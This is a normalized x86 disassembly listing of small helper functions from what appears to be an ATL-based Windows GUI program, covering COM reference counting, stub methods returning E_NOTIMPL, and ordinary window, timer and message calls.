retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404650
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4046a0
mov eax [ ecx ]
retn
sub_4046b0
mov edx [ ecx ]
lea eax [ edx + 0x8 ]
mov [ ecx ] eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_4046c0
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_4046e0
push esi
mov esi ecx
call sub_403d70
mov eax esi
pop esi
retn
sub_404730
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404780
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404790
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4047b0
mov eax r--data
retn
sub_4047c0
mov eax ecx
retn 0x4
sub_4047d0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_4047e0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4047f0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_404810
mov eax 0x1fffffff
retn
sub_4048f0
mov eax [ esp + 0x4 ]
lea ecx [ eax * 8 ]
push ecx
call sub_42e3bc
add esp 0x4
retn 0x4
sub_404a30
xor eax eax
retn
sub_404a40
mov eax ecx
mov [ eax ] r--data
retn
sub_404ab0
mov eax ecx
retn
sub_404ac0
mov eax ecx
retn
sub_4052b0
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_4052c0
mov ecx [ ecx + 0x8 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_4052d0
push esi
mov esi ecx
call sub_403d70
mov eax esi
pop esi
retn
sub_405430
mov eax ecx
retn
sub_405440
mov eax ecx
retn
sub_405530
sub [ esp + 0x4 ] 0x4
jmp sub_40e3e0
sub_405540
sub [ esp + 0x4 ] 0x4
jmp sub_40e400
sub_405aa0
mov eax ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_405bb0
mov eax ecx
retn
sub_405bc0
mov eax ecx
retn
sub_405bd0
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
pop esi
retn
call sub_405450
mov [ esi ] 0x0
sub_405de0
push esi
mov esi ecx
call sub_4059f0
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_405e00
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov [ eax ] 0x1
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_405f20
mov eax 0x1
retn 0x4
sub_405f30
mov eax 0x1
retn 0x4
sub_406060
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
mov ecx rw-data
call sub_406080
retn 0x10
sub_406390
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4063a0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4064a3
mov eax r-xdata
retn
sub_406630
push esi
mov esi ecx
mov al [ esi + 0x4 ]
test al al
je r-xdata
pop esi
retn
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
sub_406c50
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
mov [ esp + 0x4 ] eax
jmp [ ecx + 0x4 ]
sub_406c60
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
mov [ esp + 0x4 ] eax
jmp [ ecx + 0x8 ]
sub_406c70
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
mov [ esp + 0x4 ] eax
jmp [ ecx ]
sub_406d90
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
pop esi
retn
call sub_405450
mov [ esi ] 0x0
sub_407620
push ecx
call [ VariantClear@IAT ]
retn
sub_4076b0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov eax ecx
retn 0x4
sub_4076f0
sub [ esp + 0x4 ] 0x4
jmp sub_4076b0
sub_407700
sub [ esp + 0x4 ] 0x4
jmp sub_4076c0
sub_407710
sub [ esp + 0x4 ] 0x8
jmp sub_4076b0
sub_407720
sub [ esp + 0x4 ] 0x8
jmp sub_4076c0
sub_407730
sub [ esp + 0x4 ] 0xc
jmp sub_4076b0
sub_407740
sub [ esp + 0x4 ] 0xc
jmp sub_4076c0
sub_407750
sub [ esp + 0x4 ] 0x10
jmp sub_4076b0
sub_407760
sub [ esp + 0x4 ] 0x10
jmp sub_4076c0
sub_407770
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push r--data
push edx
call [ Ordinal_ATL71_32@IAT ]
retn 0xc
sub_407790
mov eax r--data
retn
sub_4077d0
sub [ esp + 0x4 ] 0x4
jmp sub_407770
sub_4077e0
sub [ esp + 0x4 ] 0x8
jmp sub_407770
sub_4077f0
sub [ esp + 0x4 ] 0xc
jmp sub_407770
sub_407800
sub [ esp + 0x4 ] 0x10
jmp sub_407770
sub_407810
push esi
mov esi ecx
call sub_407830
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_407920
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x4 ]
inc ecx
mov [ eax + 0x4 ] ecx
mov eax ecx
retn 0x4
sub_4079d0
push esi
mov esi ecx
call sub_4079f0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_407ac0
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_407a60
add esp 0x14
retn
sub_407b5e
mov eax r-xdata
retn
sub_407c3e
mov eax sub_407c44
retn
sub_407c90
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_407a60
add esp 0x10
retn 0x8
sub_407cb0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov [ esp + 0x4 ] eax
jmp sub_407bb0
mov [ esp + 0x4 ] eax
jmp sub_407ae0
sub_407d10
mov eax [ esp + 0x4 ]
push eax
push r--data
push 0x0
call sub_407ae0
retn
sub_408510
add ecx 0xf4
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
sub_408520
mov eax [ ecx + 0x110 ]
retn
sub_408640
push esi
mov esi ecx
call sub_408600
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_408780
mov eax [ ecx + 0x8 ]
mov ecx [ eax + 0x64 ]
mov edx [ ecx + 0x4 ]
push 0x0
push 0x0
push 0x10
push edx
call [ PostMessageW@IAT ]
retn
sub_4087a0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_4087b0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_408830
push esi
mov esi ecx
call sub_4086b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_408a70
push ecx
push sub_408850
call sub_4122b0
mov ecx eax
call sub_412220
call sub_4122b0
mov ecx eax
jmp sub_411a00
sub_408ac0
mov eax ecx
retn
sub_408ad0
mov eax ecx
mov [ eax ] 0x0
retn
sub_408ae0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_408b50
mov eax [ ecx ]
retn
sub_408b60
mov eax ecx
mov [ eax ] r--data
retn
sub_408b70
mov [ ecx ] r--data
retn
sub_408b80
xor eax eax
retn 0x8
sub_408b90
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_408bb0
lea eax [ ecx + 0x5c ]
retn
sub_408c10
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push edx
push ecx
call [ Ordinal_ATL71_43@IAT ]
retn 0x8
sub_408c30
push ecx
call [ Ordinal_ATL71_44@IAT ]
retn
sub_408c40
push esi
mov esi ecx
call sub_408c60
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_408ca0
add ecx 0x24
jmp sub_407230
sub_408d10
mov edx [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov eax [ ecx + 0xc ]
sub eax edx
sar eax 0x3
retn
xor eax eax
retn
sub_408d30
mov edx [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax edx
sar eax 0x3
retn
xor eax eax
retn
sub_408d50
xor eax eax
retn
sub_408d60
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_408da0
mov eax ecx
mov ecx [ esp + 0x4 ]
lea edx [ ecx * 8 ]
add [ eax ] edx
retn 0x4
sub_408dc0
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
sar eax 0x3
retn 0x4
sub_408dd0
mov eax [ esp + 0x8 ]
retn
sub_408de0
retn
sub_408df0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call [ SetWindowLongW@IAT ]
retn
sub_408e10
mov eax [ esp + 0x4 ]
push eax
push ecx
push rw-data
push rw-data
call [ Ordinal_ATL71_45@IAT ]
retn 0x4
sub_408e30
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_408e40
xor eax eax
retn
sub_408e50
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov ecx [ ecx ]
push eax
mov eax [ esp + 0x8 ]
push edx
push eax
push ecx
call [ SendMessageW@IAT ]
retn 0xc
sub_408e70
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
push eax
push ecx
call [ GetWindowRect@IAT ]
retn 0x4
sub_408e90
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
push eax
push ecx
call [ GetClientRect@IAT ]
retn 0x4
sub_408eb0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov ecx [ ecx ]
push eax
mov eax [ esp + 0x8 ]
push edx
push eax
push ecx
call [ SetTimer@IAT ]
retn 0xc
sub_408ed0
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
push eax
push ecx
call [ KillTimer@IAT ]
retn 0x4
sub_408f50
mov eax [ ecx + 0xc ]
retn
sub_408f60
push ecx
call [ IsRectEmpty@IAT ]
retn
sub_408f70
mov eax [ esp + 0x4 ]
push eax
push ecx
call [ EqualRect@IAT ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_409030
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax 0x56000000
sub_409040
mov eax [ esp + 0x4 ]
retn
sub_409050
mov eax ecx
retn
sub_409100
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax 0x56000000
sub_409110
mov eax [ esp + 0x4 ]
retn
sub_409200
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
jmp [ eax + 0x18 ]
sub_4096c0
mov eax rw-data
retn
sub_4096d0
mov eax [ ecx ]
mov ecx [ esp + 0x8 ]
lea edx [ eax + ecx * 8 ]
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_4096f0
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
sar eax 0x3
retn 0x4
sub_4099d0
xor eax eax
retn 0x10
sub_4099e0
xor eax eax
retn 0x8
sub_4099f0
retn 0x4
sub_409a00
mov eax sub_409a10
retn
sub_409c20
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_409740
add esp 0x14
retn
sub_409c40
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_4097d0
add esp 0x8
retn 0x8
sub_409ce0
push esi
mov esi ecx
call sub_409960
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40a0df
mov edx [ ebp - 0x14 ]
push edx
mov esi [ ebp - 0x24 ]
push esi
mov ecx [ ebp - 0x1c ]
call sub_407c90
push esi
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_40a2f0
add ecx 0x80
jmp sub_40a280
sub_40a5e0
mov eax [ esp + 0x4 ]
mov ecx [ ecx + 0x50 ]
push eax
push ecx
call [ ShowWindow@IAT ]
retn 0x4
sub_40a600
mov eax [ esp + 0x4 ]
test eax eax
jge r-xdata
retn
push eax
call sub_42cee0
sub_40a650
push esi
mov esi ecx
push esi
call [ VariantInit@IAT ]
mov eax esi
pop esi
retn
sub_40a6f0
push ecx
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
retn
push eax
call sub_42cee0
sub_40a7b0
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push edx
call [ Ordinal_ATL71_11@IAT ]
mov [ esi + 0x28 ] 0xfefefefe
pop esi
retn 0x8
sub_40a7e0
mov eax ecx
mov [ eax ] 0x0
retn
sub_40a7f0
mov eax [ ecx ]
retn
sub_40a800
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
retn
push 0x80004003
call sub_42cee0
sub_40a820
mov edx [ ecx ]
xor eax eax
test edx edx
setne al
retn
sub_40a830
mov eax ecx
mov [ eax ] 0x0
retn
sub_40a840
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
retn
push 0x80004003
call sub_42cee0
sub_40a860
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40a870
mov eax ecx
retn
sub_40a880
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_40a890
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
push esi
mov esi [ edx ]
xor ecx ecx
cmp eax esi
setne cl
mov al cl
pop esi
retn 0x4
sub_40a8b0
xor eax eax
retn
sub_40a8f0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40a900
mov eax r--data
retn
sub_40a910
mov eax [ esp + 0x4 ]
add eax 0x28
retn
sub_40a920
mov eax [ esp + 0x4 ]
add eax 0x29
retn
sub_40a930
mov eax [ esp + 0x4 ]
retn
sub_40a940
mov eax [ esp + 0x4 ]
add eax 0x4
retn
sub_40a950
mov eax [ esp + 0x4 ]
add eax 0x8
retn
sub_40a960
mov eax [ ecx + 0x8 ]
retn
sub_40a970
mov eax [ ecx + 0x4 ]
retn
sub_40a980
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x29 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x29 ]
test dl dl
je r-xdata
sub_40a9a0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov dl [ ecx + 0x29 ]
test dl dl
jne r-xdata
retn
lea ecx [ ecx ]
mov eax ecx
mov ecx [ eax ]
mov dl [ ecx + 0x29 ]
test dl dl
je r-xdata
sub_40a9c0
mov eax [ ecx + 0x4 ]
add eax 0x8
retn
sub_40a9d0
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_40aa40
mov eax [ esp + 0x4 ]
retn
sub_40aa50
mov eax ecx
retn
sub_40aa80
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_40aac0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40aad0
mov eax ecx
mov [ eax ] 0x0
retn
sub_40aae0
mov eax [ ecx ]
retn
sub_40aaf0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov dl [ ecx ]
mov [ eax + 0x4 ] dl
retn 0x8
sub_40ab10
mov eax ecx
retn
sub_40ab20
mov eax [ ecx ]
mov [ ecx ] 0x0
retn
sub_40ab30
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_40ab40
mov eax ecx
retn 0x4
sub_40ab50
mov eax [ ecx ]
retn
sub_40ab60
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40abd0
mov eax ecx
retn 0x4
sub_40abe0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_40abf0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ eax ]
shl ecx 0x4
add edx ecx
mov [ eax ] edx
retn 0x4
sub_40ac10
mov eax [ ecx ]
retn
sub_40ac20
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_40ac30
mov eax 0x9249249
retn
sub_40aca0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40ad20
mov eax 0xfffffff
retn
sub_40ad30
mov eax ecx
retn 0x4
sub_40ad40
mov edx [ esp + 0x4 ]
mov eax [ ecx ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
retn 0x4
sub_40ad60
retn
sub_40ad70
mov eax ecx
retn 0x4
sub_40ad80
mov eax [ esp + 0x4 ]
imul eax eax 0x2c
push eax
call sub_42e3bc
add esp 0x4
retn
sub_40ada0
mov eax [ esp + 0x4 ]
shl eax 0x4
push eax
call sub_42e3bc
add esp 0x4
retn
sub_40adc0
mov eax ecx
retn 0x4
sub_40ae10
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_40ae20
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_40aee0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov ecx [ ecx ]
push eax
mov eax [ esp + 0x8 ]
push edx
push eax
push ecx
call [ PostMessageW@IAT ]
retn 0xc
sub_40af00
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
push eax
push ecx
call [ ShowWindow@IAT ]
retn 0x4
sub_40af20
mov edx [ esp + 0x8 ]
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
retn 0x8
sub_40af40
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
retn
sub_40afb0
push esi
mov esi ecx
call sub_40afd0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40b010
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b020
mov eax ecx
retn
sub_40b030
mov eax [ ecx ]
retn
sub_40b040
mov eax ecx
mov [ eax ] 0x0
retn
sub_40b050
mov eax [ esp + 0x4 ]
mov cl [ eax ]
push esi
mov esi [ esp + 0xc ]
mov dl [ esi ]
mov [ eax ] dl
mov [ esi ] cl
pop esi
retn
sub_40b1a0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b1b0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b200
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
call [ Ordinal_ATL71_42@IAT ]
mov eax esi
pop esi
retn 0x4
sub_40b280
mov edx [ ecx + 0x8 ]
xor eax eax
test edx edx
sete al
retn
sub_40b290
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b2a0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b330
push esi
mov esi ecx
call sub_403d70
mov eax esi
pop esi
retn
sub_40b340
mov eax rw-data
retn
sub_40b350
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_40b3c0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40b3d0
mov eax [ ecx ]
add eax 0xc
retn
sub_40b3e0
push esi
mov esi ecx
call sub_40ab70
mov eax esi
pop esi
retn
sub_40b3f0
mov eax ecx
retn 0x4
sub_40b400
mov eax [ ecx ]
retn
sub_40b410
mov edx [ esp + 0x8 ]
mov eax [ ecx ]
shl edx 0x4
add edx eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_40b430
mov eax 0x9249249
retn
sub_40b490
retn 0x4
sub_40b4a0
push esi
mov esi ecx
call sub_40ac40
mov eax esi
pop esi
retn
sub_40b4b0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40b4c0
mov eax [ esp + 0x4 ]
imul eax eax 0x2c
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_40b4e0
mov eax 0xfffffff
retn
sub_40b550
mov eax [ esp + 0x4 ]
shl eax 0x4
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_40b570
mov eax ecx
retn 0x8
sub_40b5b0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_40b5d0
push esi
mov esi ecx
call sub_40add0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40b650
mov eax [ esp + 0x4 ]
push eax
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
retn
push eax
call sub_42cee0
sub_40b670
push 0x0
call [ _time64@IAT ]
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
add esp 0x4
mov [ ecx + 0x4 ] edx
mov eax ecx
retn 0x4
sub_40b8c0
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40b8d0
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40b8e0
mov eax [ ecx ]
add eax 0xc
retn
sub_40b8f0
push esi
mov esi ecx
call sub_40ab70
mov eax esi
pop esi
retn
sub_40b900
push esi
mov esi ecx
call sub_403d70
mov eax esi
pop esi
retn
sub_40b910
mov eax [ esp + 0x8 ]
push eax
call sub_40b440
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x8
sub_40b930
push esi
mov esi ecx
call sub_40ac40
mov eax esi
pop esi
retn
sub_40b940
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40b9d4
mov edx [ ebp - 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_40ba40
mov eax ecx
retn 0x8
sub_40ba50
push esi
mov esi [ ecx ]
call sub_40ab70
mov eax [ esp + 0x8 ]
mov [ eax ] esi
pop esi
retn 0x8
sub_40ba70
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_40ba90
mov ecx [ esp + 0x4 ]
jmp sub_40add0
sub_40bb40
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_40b5f0
add esp 0x8
retn 0x8
sub_40bb60
mov eax [ esp + 0x4 ]
push eax
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
retn 0x4
mov [ esp + 0x4 ] eax
jmp sub_42cee0
sub_40bcc0
call sub_40bb80
push 0x0
call [ PostQuitMessage@IAT ]
xor eax eax
retn 0x10
sub_40bdb0
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
shl eax 0x4
add eax edx
retn 0x4
sub_40bf60
mov ecx [ esp + 0x4 ]
call sub_40add0
retn 0x4
sub_40bf70
mov eax ecx
retn 0x8
sub_40c00a
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor edx edx
push edx
push edx
call _CxxThrowException
sub_40c060
mov eax [ esp + 0x4 ]
push eax
push r--data
call sub_40baa0
retn 0x4
sub_40c910
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x0
push r--data
push 0x0
push eax
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_40c540
retn 0xc
sub_40cf72
mov ecx [ ebp - 0x14 ]
call sub_40ce30
push 0x0
push 0x0
call _CxxThrowException
sub_40d090
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov [ eax ] 0x1
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_40d0b0
mov eax 0x1
retn 0x4
sub_40d0c0
mov eax 0x1
retn 0x4
sub_40d1c0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
mov ecx rw-data
call sub_406080
retn 0x10
sub_40d7b0
push esi
mov esi ecx
call sub_40cff0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40dd50
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_40dd60
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_40de00
mov eax [ ecx ]
push eax
call [ IsWindow@IAT ]
retn
sub_40de10
push esi
mov esi ecx
call sub_40dcf0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40e1a0
mov ecx [ esp + 0x4 ]
call sub_40e100
retn 0x4
sub_40e1b0
push ecx
push sub_40e1a0
call sub_4122b0
mov ecx eax
call sub_412220
call sub_4122b0
mov ecx eax
jmp sub_411a00
sub_40e1d0
mov eax 0x80004001
retn 0x18
sub_40e1e0
mov eax 0x80004001
retn 0x18
sub_40e1f0
mov eax 0x80004001
retn 0x18
sub_40e200
mov eax 0x80004001
retn 0x1c
sub_40e210
mov eax 0x80004001
retn 0x14
sub_40e220
mov eax 0x80004001
retn 0x14
sub_40e230
mov eax 0x80004001
retn 0x8
sub_40e240
mov eax 0x80004001
retn 0x4
sub_40e250
mov eax 0x80004001
retn 0x14
sub_40e260
mov eax 0x80004001
retn 0x8
sub_40e270
mov eax 0x80004001
retn 0xc
sub_40e280
mov eax 0x80004001
retn 0x14
sub_40e290
xor eax eax
retn 0x8
sub_40e2a0
mov eax 0x80004001
retn 0xc
sub_40e2b0
mov eax 0x80004001
retn 0xc
sub_40e2c0
mov eax 0x80004001
retn 0x8
sub_40e2d0
mov eax 0x80004001
retn 0x8
sub_40e2e0
mov eax 0x80004001
retn 0x8
sub_40e2f0
xor eax eax
retn 0xc
sub_40e300
mov eax 0x80004001
retn 0xc
sub_40e310
xor eax eax
retn 0x10
sub_40e320
mov eax 0x80004001
retn 0x8
sub_40e330
xor eax eax
retn 0x8
sub_40e340
xor eax eax
retn 0x8
sub_40e350
mov eax 0x80004001
retn 0xc
sub_40e360
mov eax 0x80004001
retn 0x4
sub_40e370
mov eax 0x80004001
retn 0x10
sub_40e380
mov eax [ esp + 0x8 ]
mov [ eax ] 0x0
mov eax 0x80004002
retn 0x8
sub_40e3a0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
xor eax eax
retn 0x4
sub_40e3c0
mov eax 0x80004001
retn 0x8
sub_40e3d0
mov eax 0x80004001
retn 0x4
